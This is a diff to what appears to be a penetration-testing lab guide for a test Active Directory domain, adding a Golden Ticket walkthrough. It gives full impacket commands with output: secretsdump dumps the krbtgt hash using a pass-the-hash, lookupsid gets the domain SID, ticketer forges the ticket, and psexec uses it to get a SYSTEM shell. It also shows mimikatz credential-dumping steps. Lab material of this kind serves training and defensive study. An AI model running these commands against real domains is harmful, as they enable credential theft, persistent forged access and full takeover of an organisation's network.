@@ -744,10 +744,84 @@ LAB\nonexistentuser
 
 # 5. Golden Ticket
 
-## 5.1. Dump password hashes on domain controller
+## 5.1. Using impacket
 
-- Requires `Domain Admins` rights
-- Information of interest: domain SID and `krbtgt` password hash
+If you already have password or hash of domain admin user, the attack can be performed from Kali via impacket
+
+☝️ All Impacket scripts can be called in Kali with `impacket-<script name>`, there's no need to do `python3 /usr/share/doc/python3-impacket/examples/<script name>.py`
+
+### 5.1.1. Retrieve krbtgt password hash
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-secretsdump -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
+⋮
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+⋮
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:09320ee4ca4f627b183bba1335d1c0c7:::
+⋮
+```
+
+### 5.1.2. Uplookup domain SID
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-lookupsid -hashes 00000000000000000000000000000000:e19ccf75ee54e06b06a5907af13cef42 lab.vx/domainadmin@192.168.17.11
+⋮
+[*] Domain SID is: S-1-5-21-2009310445-1600641453-2559099802
+⋮
+```
+
+### 5.1.3. Create golden ticket
+
+```console
+┌──(root㉿kali)-[~]
+└─# impacket-ticketer -nthash 09320ee4ca4f627b183bba1335d1c0c7 -domain-sid S-1-5-21-2009310445-1600641453-2559099802 -domain lab.vx user:nonexistentuser
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for lab.vx/user:nonexistentuser
+[*]     PAC_LOGON_INFO
+[*]     PAC_CLIENT_INFO_TYPE
+[*]     EncTicketPart
+[*]     EncAsRepPart
+[*] Signing/Encrypting final ticket
+[*]     PAC_SERVER_CHECKSUM
+[*]     PAC_PRIVSVR_CHECKSUM
+[*]     EncTicketPart
+[*]     EncASRepPart
+[*] Saving ticket in user:nonexistentuser.ccache
+```
+
+### 5.1.4. Use the golden ticket to connect to **any** domain machine
+
+The `-k` option of `impacket-psexec` means use Kerberos authentication; it grabs credentials from ccache file specified in `$KRB5CCNAME` environment variable
+
+```console
+┌──(root㉿kali)-[~]
+└─# export KRB5CCNAME=user:nonexistentuser.ccache
+
+┌──(root㉿kali)-[~]
+└─# impacket-psexec lab.vx/nonexistentuser@svr.lab.vx -k -no-pass -target-ip 192.168.17.12 -dc-ip 192.168.17.11
+Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
+
+[*] Requesting shares on 192.168.17.12.....
+[*] Found writable share ADMIN$
+[*] Uploading file ZnEsDRVp.exe
+[*] Opening SVCManager on 192.168.17.12.....
+[*] Creating service ORJv on 192.168.17.12.....
+[*] Starting service ORJv.....
+[!] Press help for extra shell commands
+Microsoft Windows [Version 10.0.20348.1129]
+(c) Microsoft Corporation. All rights reserved.
+
+C:\Windows\system32> whoami
+nt authority\system
+```
+
+## 5.2. Using mimikatz
+
+### 5.2.1. Retrieve krbtgt password hash
 
 ```cmd
 mimikatz # privilege::debug
@@ -755,18 +829,15 @@ Privilege '20' OK
 
 mimikatz # lsadump::lsa /patch
 Domain : LAB / S-1-5-21-1470288461-3401294743-676794760
-
 ⋮
-
 RID  : 000001f6 (502)
 User : krbtgt
 LM   :
 NTLM : 3ac4cccaca955597db0d11a7ffa50025
-
 ⋮
 ```
 
-## 5.2. Create golden ticket using information retrieved from domain controller
+### 5.2.2. Create golden ticket
 
 - This can be performed on any domain member machine, without administrator rights
 - ☝️ **Note**: it is important to run `kerberos::purge` even if `klist` show zero cached tickets
@@ -798,7 +869,7 @@ mimikatz # misc::cmd
 Patch OK for 'cmd.exe' from 'DisableCMD' to 'KiwiAndCMD' @ 00007FF6FF396438
 ```
 
-## 5.3. Use the golden ticket to laterally move to **any** domain machine
+### 5.2.3. Use the golden ticket to connect to **any** domain machine
 
 - Verify golden ticket in session
 
